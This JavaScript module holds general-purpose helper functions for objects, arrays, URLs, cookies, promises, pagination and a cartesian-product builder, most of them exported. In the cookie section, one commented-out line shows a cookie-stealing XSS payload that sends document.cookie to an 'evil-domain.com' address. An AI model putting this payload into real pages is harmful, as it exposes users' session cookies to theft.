/*
import * as R from 'ramda'
import * as _ from 'lodash'
import * as I from 'immutable'
*/


const R=require('ramda')
const _=require('lodash')
const I=require('immutable')


const {
    entries:toPairs,
    fromEntries:fromPairs,
    keys,
    values,
    assign
}=Object;
const {isArray}=Array;


const it=x=>x;
const say=(x="")=>(y="")=>console.log(x,y);
const say1=(x)=>(y)=>(console.log(x,y),y);
const say_error=(x)=>(y)=>(console.error(x,y),y);
const welcome=x=>console.log("%c"+x,'font: 10rem roboto;color #dd4814');
const cp=(o={})=>JSON.parse(JSON.stringify(o));
const cp0=(o1,o2)=>k=>o1[k]=o2[k];
const cp1=(o1={})=>(o2={})=>assign(o2,o1);
const cp2=(o1={})=>(o2={})=>toPairs(o1).reduce((a,[k,v])=>(a[k]=v,a),o2);
const merge_o=(...a)=>fromPairs(a.map(x=>toPairs(x)).flat());
const merge_o1=(...a)=>a.reduce((x,y)=>({...x,...y}),{});
const is_null=x=>!x;
const is_obj=(o="")=>o.constructor==Object
const is_array=(a="")=>a.constructor==Array
const is_empty=(a=[])=>a.length==0
const is_empty1=(d=[])=>_.isArray(d) && _.isEmpty(d)
const is_not_empty=(d=[])=>_.isArray(d) && (!_.isEmpty(d))
const is_empty2=(o={})=>Object.values(o).every(is_null)
const is_local=()=>/localhost/.test(window.location.href)

// a={x:"ccc1",y:2}
// has("ccc")("x")(a)
const has=(b)=>(k="name")=>(a={})=> !b || new RegExp(b).test(a[k])
const map_to_json=x=>fromPairs(toPairs(x))
const json2str=o=>JSON.stringify(o,null,'\t')
const to_s=(o) => is_obj(o) ?JSON.stringify(o,null,"\t") : o.toString()
const maybe_json=(s="")=> /\[.*\]|\{.*\}/.test(s);
const to_json=(s="{}")=>{
    try{
        return JSON.parse(s)
    }catch(e){
        return {}
    }
}
const to_json1=(s="")=>maybe_json(s) ? JSON.parse(s) : ({})
const to_num=(x=0)=>/\d+/.test(x) ? +(/\d+/.exec(x)[0]) :0

//---------------------------------------url-----------------

const param2json=(s1="; ")=>(s2="=")=>(str)=>str.split(s1).map(a=>a.split(s2)).reduce((a,[k,v])=>(a[k]=v,a),{})
const param2map=(s1="; ")=>(s2="=")=>(str)=>str.split(s1).map(a=>a.split(s2)).reduce((a,[k,v])=>(a.set(k,v),a),new Map())
const serialize=(s1="=")=>(s2="&")=>(o={})=>toPairs(o).map(([k,v])=>`${k}${s1}${v}`).join(`${s2}`)
const serializeMap=(s1="=")=>(s2="&")=>(o={})=>[...o].map(([k,v])=>`${k}${s1}${v}`).join(`${s2}`)

const test_serialize=()=>{
    let p1=param2json(", ")("=")(document.cookie)
    let p2=param2json("&")("=")("a=b&c=d")
    let p3=param2map(", ")("=")(document.cookie)
    let p4=serializeMap()()(p3)
    let b=serialize()()({x:1,y:2})
}

// url_formator()() -> '/i/orders/1'
const url_formator=(u0='/i/orders/:{id}')=>(d={"id":1})=>{
    let [k,v]=toPairs(d).flat()
    let r='(.*):{'+ k +'}';
    let re=new RegExp(r)
    let u1=u0.match(re)[1]+v
    return u1
}
const find_filename=(n="")=>{
   const extra=(n)=>/\./.test(n)?n.split('.') :n
   let [name1,]=extra(n)
   return name1
}
//---------------------------------------mobile-----------------
const is_weixin=(userAgent="")=>/micro/i.test(userAgent)
const is_weixin1=()=>false||is_weixin(navigator.userAgent)
const mobile_not_weixin=ua=>/Android|iPhone|Mobile/.test(ua) && !(/MicroMessenger/.test(ua))
const mobile_not_weixin1=()=>mobile_not_weixin(navigator.userAgent)
//---------------------------------------time-----------------
const sleep=(n=1)=>new Promise((resolve)=>setTimeout(resolve,n*1000))
//const sleep=(ms=1000)=>new Promise(resolve => setTimeout(resolve, ms))
const timeout=sleep
const sleep1=async(fn, ...args)=> {
    await timeout(3000);
    return fn(...args);
}
const now=()=>moment().format('YYYYMMDD')
const unix2l=t=>moment.unix(t).format('Y-MM-DD hh:mm')
const today=()=> moment().format('YYYYMMDD')
const today_w=()=>moment().weekday()
const weekday=(n=-1)=> today_w() == 6  ? today() : moment().add(-moment().weekday(),"days").add(n,"days").format('YYYYMMDD')


//---------------------------------------iter..-----------------
const map=f=>(a=[])=>a.map(f)
const pmap=(f)=>(x=[])=>Promise.all(x.map(f));
const queque=(arr=[])=>Promise.all(arr)

const for_each=f=>(o={})=>toPairs(o).map(f)

const each=f=>o=>toPairs(o).map(([k,v])=>f(k,v))
const each1=fn=>(a={})=>I.Map(a).map(fn);
const each2=(a={})=>fn=>toPairs(a).map(([k,v],i,o)=>fn(k,v,i,o))
const each3=fn=>(a={})=>toPairs(a).map(([k,v],i,o)=>fn(k,v,i,o))

const each_k=f=>o=>toPairs(o).map(([k])=>f(k))
const each_v=f=>o=>toPairs(o).map(([,v])=>f(v))
const each_v1=f=>o=>fromPairs(toPairs(o).map(([k,v])=>[k,f(v)]))

const reducer_arr=(f)=>(arr=[])=>arr.reduce((a,b)=>(a[b]=f(b),a),{});
const reducer=fn=>(o={})=>toPairs(o).reduce(fn,{})
const reducer1=fn=>(o={})=>toPairs(o).reduce((a,[k,v])=>(a[k]=fn(k,v),a),{})
const reducer_with_origin=(f)=>(o={})=>c=>toPairs(o).reduce((a,[k,v])=>(a[k]=f(k,v),a),c)
const cp3=(o1={})=>(o2={})=>reducer_with_origin((k,v)=>v)(o1)(o2)

const repeat1=(x,n)=>Array(n).fill(x)


const run_parallel =(fs=[])=>fs.map(x=>x())
const run_parallel_p =(fs=[])=>Promise.all(fs.map(x=>x()))


const run_sequential=(fs=[],result)=>fs.reduce((acc,f)=>f(acc),result)
const run_repeat=async (f,n=1,result)=>run_sequential(repeat1(f,n),result)

const run_sequential_p1=async ([h,...t],result)=> h ?  run_sequential(t,await h(result)) : result
const run_sequential_p2=async(fs,result)=>fs.reduce(async (acc,f)=>f(await acc),result)
const run_repeat_p=async (f,n=1,result)=>run_sequential_p2(repeat1(f,n),result)


const run=(fs=[],mapper=it)=>(x=0)=>mapper(fs).reduce((a,f)=>f(a),x)
const pipe=(...fs)=>run(fs.flat())
const pipe1=(...fs)=>run(fs.flat(),reverse)
const pipe2=(fs=[])=>x=>fs.reduce((acc,b)=>b(acc),x)
const pipe3=(fs=[])=>(arr=[])=>fs.reduce((a,b)=>b(a),arr)

//f=(context,next)=>{...;next()}
//compose([f1,f2,...,fn])
const compose=([h,...t])=>ctx=>{
    if (!h) { return ; }
    h(ctx,()=>compose(t)(ctx))
}
//f=async(ctx,next)=>{await g(ctx),await next()}
//compose([f1,f2,...,fn])
const compose1=([h,...t])=>async ctx=>{
    if (!h) { return ; }
    await h(ctx,()=>compose1(t)(ctx))
}

async function* lazy(f,n) {
    for (let i of n){
        yield f(i)
    }
}
async function loop(fn,input,interval=2000){
  let r=[]
  for await (const i of lazy(fn,input)) {
       r.push(i)
       await timeout(interval)
  }
  return r
}
async function loop_cb(fn,cb,input,interval=2000){
    let r=[]
    let p=async ([h,...t])=>{
        if (h) {
           console.log(t.length)
           r.push(fn(h))
           await setTimeout(()=>p(t),interval)
        }else{
            cb(r)
        }
    }
   p(input)
}
//--------------------------------promisify--------------------------------------
const promisify0=(fn,t)=>(...arg)=>new Promise((f1,f2)=>fn.call(t,...arg,(err,d)=>err?f2(err):f1(d)))   //fn(...,cb=(err,d)=>(...)) //redis..
const promisify1=(fn)=>(...arg)=>new Promise((f1,f2)=>fn(...arg,(err,d)=>err?f2(err):f1(d)))   //fn(...,cb=(err,d)=>(...))
const promisify2=(fn)=>(...arg)=>new Promise((f1,f2)=>fn(...arg,f1))   //fn(...,cb)
const promisify3=(fn)=>(...arg)=>new Promise((f1,f2)=>fn(f1,...arg,))  //fn(cb,...)
const promisifyAll=(c)=>{
    let f=([k,v])=>c.__proto__["_"+k]=promisify0(v,c)
    each(f)(c.__proto__)
    return c
}
const promisifyAll1=(c)=>{
    let p=c.constructor;
    let o=p.prototype
    let f=([k,v])=>o["_"+k]=promisify0(v,c)
    each(f)(o)
    return c
}

//--------------------------------math--------------------------------------
const rnd=(n=1)=>Math.floor(Math.random()*n)
const rnd0=(n=1)=>parseInt(Math.random()*10**n)
const rnd1=pipe((x=10)=>x*Math.random(),Math.floor)
const rnd_pick=(arr=[])=>arr[rnd(arr.length)]
const minus=k=>(a,b)=>a[k]-b[k]
const add=(a,b)=>isNaN(+b) ? a : (+b)+a ;
const add1=(arr=[])=>arr.reduce(add,0);
const add2=(arr=[])=>k=>add1(arr.map(y=>y[k]));
const sum=(arr=[])=>arr.reduce((a,b)=>a+b,0)
const sum1=z=>toPairs(z).reduce((a,b)=>(a=a+b[1],a),0)
const sumby=(arr=[])=>k=>sum(pick(arr)(k))
const minby=(arr=[])=>(key)=>Math.min(...arr.map(x=>x[key]))
const maxby=(arr=[])=>(key)=>Math.max(...arr.map(x=>x[key]))
//---------------------------------------[],[{}...],{}-----------------
const range=(n=10)=>Array(n).fill(0).map((x,i)=>i)
const fill=(arr=[])=>(i=true)=>arr.map(x=>i)
const fill1=(i=true)=>(arr=[])=>arr.map(x=>i)
const repeat=(d)=>(n=5)=>Array(n).fill(0).map(()=>d)
const reverse=(a=[])=>a.reduceRight((a,b)=>([...a,b]),[])
const first=(a=[])=>a[0]||""
const last=a=>a.reduce((x,y)=>y)
const last1=a=>a.slice(-1)
const tail=([h,...t])=>t


const take=(a,n)=>a.slice(0,n)
const pick=(arr=[])=>k=>arr.map(x=>x[k]);

const drop=(o={})=>(k="")=>reducer((a,[k1,v])=>{
    k1!=k ? a[k1]=v :null;
    return a
})(o)
const drop1=o=>k=>I.Map(o).remove(k).toJS()
const drop_empty=(o={})=>reducer((a,[k,v])=>{
  if ( v==0 || v) {a[k]=v}
  return a;
})(o)

const append=(arr=[])=>(d={})=>[...arr,d]
const sortBy=k=>(ascend=true)=> ascend ? R.sortBy(R.prop(k)) : R.sort(R.descend(R.prop(k)))
const zip=(...arg)=>{
     let [h1,h2,...t]=arg;
     if (!h2) return h1
     let d=h1.map((x,i)=>isArray(x)? [...x,h2[i]] :[ x , h2[i]])
     return zip(d,...t)
}
const zip1=(x,y)=>fromPairs(x.map((x1,i)=>[x1,y[i]]))
const zip2=(a=[],b=[])=>a.map((x,i)=>[x,b[i]])

const flat=a=>a.map(x=>[...x]).flat()
const uniq=(arr=[])=>[...new Set(arr.flat())]
const uniq1=(arr=[])=>[...new Set(arr)];
const group_by=(cat=[])=>(d)=>fromPairs(cat.map(x=>[x,d.filter(y=>new RegExp(x,"i").test(y.title)).length,]))

const add_key=(o={uid:0,status: 'done'})=>(a=[])=>a.map((x,i)=>({...x,...o,uid:i}))
const add_keys=(kk=[])=>(arr=[])=>arr.reduce((acc,x,i)=>(acc[kk[i]]=x,acc),{})

const add_key1=(b=[])=>(a=[])=>a.reduce((acc,v,i)=>(acc[b[i]]=v,acc),{})
const add_keys1=(a=[])=>(b=[])=>a.map(add_key1(b));
//add_keys1(t)(["color","size","qty"])
//---------------------------------CRUD----------------------------------
const addRow=({table,row})=>([...table,{...row}])
const updateRow=({i,table,row})=>{
   const t=cp(table)
   t[i]=cp(row)
   return t;
}
const delRow=({i,table}={i:0,table:[]})=>table.filter((x,n)=>n!==i)

const append_with_id=(a=[])=>(d={})=> d.id ? [...a,{...d}] : [...a,{...d,id:rnd(5)}] ;
const getIndexById=(a=[])=>(d={id:0})=>a.findIndex(x=>x.id==d.id)
const findByKey=(arr=[])=>(d={})=>(k="id")=>arr.findIndex(x=>x[k]==d[k])
const removeById=(a=[])=>(d={id:0})=>a.filter(x=>x.id!=d.id)
const removeByKey=(arr=[])=>(d={})=>(k="id")=>arr.filter(x=>x[k]!=d[k]);
const updateByKey=(arr=[])=>(d={})=>(k="")=>{
      let i=findByKey(arr)(d)(k)
      let a1=cp(arr);
      a1[i]=d;
      return a1;
}
const updateById=(a=[])=>(d={id:0})=>{
    let b=cp(a)
    b[b.findIndex(x=>x.id==d.id)]=cp(d);
    return b;
}
const updateById1=(o=[])=>(d={id:0})=>{
    let i=getIndexById(o)(d);
    let z=o[i];
    each2(z)(cp1(z,d))
}
//---------------------------------分页----------------------------------
const slice1=(arr=[])=>(current=1)=>(size=10)=>{
      let p1=current*size,p2=p1+size;
      return arr.slice(p1,p2)
}
const len1=(arr=[])=>(size=1)=>{
    let l1=arr.length
    let l2=l1/size
    return [l1,l2]
}
//---------------------------------find----------------------------------
const filter=(arr=[])=>(o={})=>{
    if (is_empty(o)) { return arr; }
    let o1=drop_empty(o)
    let [k,ks]=keys(o1);
    let arr1= k ? arr.filter(x=>new RegExp(o1[k]).test(x[k])) :arr;
    if (ks) {
        let o2=drop(o)(k);
        return filter(arr1)(o2)
    }
    return arr1;
}
const filter_gen =(arr=[])=>k=> R.pipe(R.pluck(k),R.uniq,R.filter(x=>x!==""),R.map(x=>({"text":x,value:x})))(arr)

const clean=R.filter(x=>x.length>0)
const search_fieldes_gen=reducer1(()=>([]));
const search=(arr=[])=>(c={})=>{
    let c0=clean(c);
    if  (R.isEmpty(arr) || R.isEmpty(c0))  return arr;
    let [k1,...k2]=R.toPairs(c0);
    let a1;
    if (k1.length){
        let [kk,vv]=k1;
        let a1= arr.filter(x=>vv.includes(x[kk]))
        let c1=R.fromPairs(k2);
        return search(a1)(c1)
    }
    return arr
}


//---------------------------------------cookie-----------------------------------------
//(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;

const parse_cookie=()=>document.cookie.split('; ').map(x=>x.split("="))
const cookie2map=(z="")=>new Map(parse_cookie())
const cookie2json=()=>fromPairs(parse_cookie())
const json2cookie=(z={})=>toPairs(z).map(x => x.join('=')).join('; ')+";"
const cookie_proxy=()=>{
    let oo={
        set: (o, k, v) => k == "cookie" ? document.cookie = json2cookie(v) : o[k] =v,
        get: (o, k) => k == "cookie" ?  cookie2map(o[k]): o[k],
    }
    return new Proxy(document, oo);
}
const test_cookie=()=>{
        const  cc =cookie_proxy()
        cc.cookie = { x: 222, y: 333 }
        cc.cookie.get('x')
        c=cc.cookie
        console.log(c,[...c])
}
//---------------------------------------dom-----------------
const form2pairs=(f="#add_link")=>([...document.querySelector(f)]
    .filter(x=>x.name)
    .map(({name,value})=>[name,value]))

const form2json=(f="#add_link")=>R.fromPairs(form2pairs())
const create_tag=(p=document.body,tag="iframe",o={ "width": "100%", "height":"100%", "frameborder": "0", "scrolling": "auto", })=>(d={})=>{
    let z=document.createElement(tag);
    const add_attr=([k,v])=>z.setAttribute(k,v)
    for_each(add_attr)({ ...o, ...d,})
    p.append(z)
}
const save=(k,v)=>localStorage[k]=JSON.stringify(v)

const is_uuid=(id="")=>{
      let a='8aa52d58-6b69-4a6a-8a6d-c7dfdcbb9f7f';
      let b=a.split('-').map(x=>x.length).map(x=>`.{${x}}`).join('-')
      let re= new RegExp(b);
      return re.test(id)
}

//---------------------------------------proxy-----------------
const or_reg=(arr=[])=>new RegExp(arr.join('|'));
const json_proxy=(o={})=>new Proxy(o ,{ get :(o,n)=>n in o ? JSON.parse(o[n]) :o[n]});
const int_proxy=(o={})=>new Proxy(o,{get:(o,n)=>+o[n]||0});
const int_proxys=(kk=[])=>(o={})=>new Proxy(o,{get:(o,n)=>kk.includes(n) ? +o[n]||0 : o[n]});
const int_proxys1=(kk=[])=>(o={})=>new Proxy(o,{get:(o,n)=>{
    if (!kk.length) {
        return o[n];
    }else{
        return or_reg(kk).test(n) ? +o[n]||0 : o[n]
    }
 }});

const int_fomator=(k=[])=>(o={})=>cp(int_proxys(k)(o));
const int_fomator1=(k=[])=>(o={})=>cp(int_proxys1(k)(o));
const int_formator2=(kk=['value','qty'])=>x=>toPairs(x).map(([k,v])=>(kk.includes(k) ? [k,+v]:[k,v]));
const int_formators=(kk=['value','qty'])=>(arr=[])=>arr.map(int_formator(kk)).map(fromPairs);
//const localStorage1=json_proxy(window.localStorage);

//-------------------------笛卡尔积-------------------------------------------
const cross_join=(a=[])=>(b=[])=>{
    const join=(i,j)=>i+"_"+j;
    let t1=a.map((x,i)=>(b.map((y,j)=>[join(i,j),0]))).flat()
    let t2=a.map((x,i)=>(b.map((y,j)=>[join(i,j),[x,y]]))).flat()

    let kv1=new Map(t1)
    const set_qty=(i,j,v=0)=>kv1.set(join(i,j),v);
    const reset_qty=(vv=0)=>kv1.forEach((v,k)=>kv1.set(k,vv))
    const get_qty=(i,j)=>kv1.get(join(i,j));
    const add_qty=(i,j,v=0)=>{
        let v0=get_qty(i,j),
            v1=v0+v;
        kv1.set(join(i,j),v1)
    }
    let kv2=new Map(t2)
    const decode=(i,j)=>kv2.get(join(i,j));
    const decodes=()=>[...kv1].map(([k,v],i)=>[k,...kv2.get(k),v])
    const decodes1=(k=["attr","color","size","qty"])=>decodes().map(add_keys(k))
    const v_decodes=()=>decodes1().filter(x=>x.qty>0)
    const total=(k="qty")=>sumby(decodes1())(k)
    return {
        decode,
        decodes,
        decodes1,
        v_decodes,
        kv1,
        set_qty,
        get_qty,
        add_qty,
        reset_qty,
        init:()=>new Map(t1),
        total,
    }
}

const cross_join1=(arr1=[])=>(arr2=[])=>(d=0)=>{
      let o={};
      let dict={};
      const gen_index=(i,j)=>{
          let k=`${i}_${j}`;
          o[k]=d;
          dict[k]=[arr1[i],arr2[j]]
      }
      arr1.forEach((v1,i)=>arr2.forEach((v2,j)=>gen_index(i,j)))
      const decode=(obj={})=>(
            toPairs(obj)
            .filter(([k,v])=>v>0)
            .map(([k,v])=>[...dict[k],v])
      )
      return [o,dict,decode];
}

//---------------------------------------curry-----------------
function curry(f,reset=true,){
   let a=[];
   const l = f.length
   if (l == 0 ) return f
   const g=(...arg)=>{
       a.push(...arg)
       if (a.length >= l) {
          const v=f(...a)
          if (reset) a.length=0
          return  v
       }
       return g
    }
    return g
}

function test_curry(){
  let  f=(a,b,c,d)=>a+b+c+d
  let  g=curry(f)
  let  t=g(1)(2)(3)(4) == 10
  console.log(t)
}














//export {
module.exports= {
	add,
	add1,
	add2,
	addRow,
	append,
	clean,
	compose,
	cookie2json,
	cookie2map,
	cp,
	cp0,
	cp1,
	cp2,
	cp3,
	delRow,
	drop,
	drop1,
	each,
	each1,
	each2,
	each3,
	fill,
	fill1,
	filter,
	findByKey,
	first,
	flat,
	form2json,
	form2pairs,
	getIndexById,
	has,
	it,
	json2cookie,
	json2str,
	last,
	last1,
	len1,
	map,
	maxby,
	minby,
	minus,
	now,
	param2json,
	param2map,
	pick,
	pipe,
	pipe1,
	pipe2,
	pipe3,
	pmap,
	queque,
	range,
	reducer,
	reducer1,
	removeById,
	removeByKey,
	repeat,
	reverse,
	rnd,
	rnd0,
	rnd1,
	run,
	save,
	say,
	say1,
	search,
	serialize,
	serializeMap,
	sleep,
	sleep1,
	slice1,
	sortBy,
	sum,
	sum1,
	sumby,
	tail,
	take,
	timeout,
	to_json,
	to_json1,
	to_s,
	uniq,
	uniq1,
	unix2l,
	updateById,
	updateById1,
	updateByKey,
	updateRow,
	weekday,
	welcome,
	zip,
	zip1,
	zip2,
}

